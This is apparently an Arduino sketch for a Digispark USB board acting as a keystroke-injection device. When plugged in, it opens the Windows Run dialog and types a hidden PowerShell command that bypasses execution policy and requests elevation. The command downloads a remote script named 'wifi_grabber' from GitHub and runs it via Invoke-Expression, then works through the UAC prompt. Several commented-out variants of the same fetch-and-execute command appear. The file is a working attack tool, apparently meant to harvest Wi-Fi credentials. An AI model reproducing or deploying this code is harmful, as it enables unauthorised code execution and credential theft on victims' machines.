#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
//  DigiKeyboard.println("powershell -w h -c \"iwr https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|iex\""); //ultrashortcommand
//  DigiKeyboard.println("powershell -windowstyle hidden -Command "& {Invoke-WebRequest -Uri https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber -UseBasicParsing | Invoke-Expression}""); //full command
//  DigiKeyboard.println("powershell -command "& {Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber -UseBasicParsing | Invoke-Expression\"'}""); //for debugging
  DigiKeyboard.println("powershell -c \"Start-Process powershell -ArgumentList '-NoP -Exec Bypass -w h -c \"iwr https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|iex\"' -Verb RunAs\""); //shortened and PRIV
  DigiKeyboard.sendKeyStroke(0, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT | MOD_ALT_LEFT);  // Ctrl + Shift + Enter
  delay(2000);  // Wait for UAC to appear

// Simulate pressing Left Arrow to focus on the "No" option in UAC
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  delay(50);  // Short delay

// Simulate pressing Enter to confirm the "No" selection
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);

}
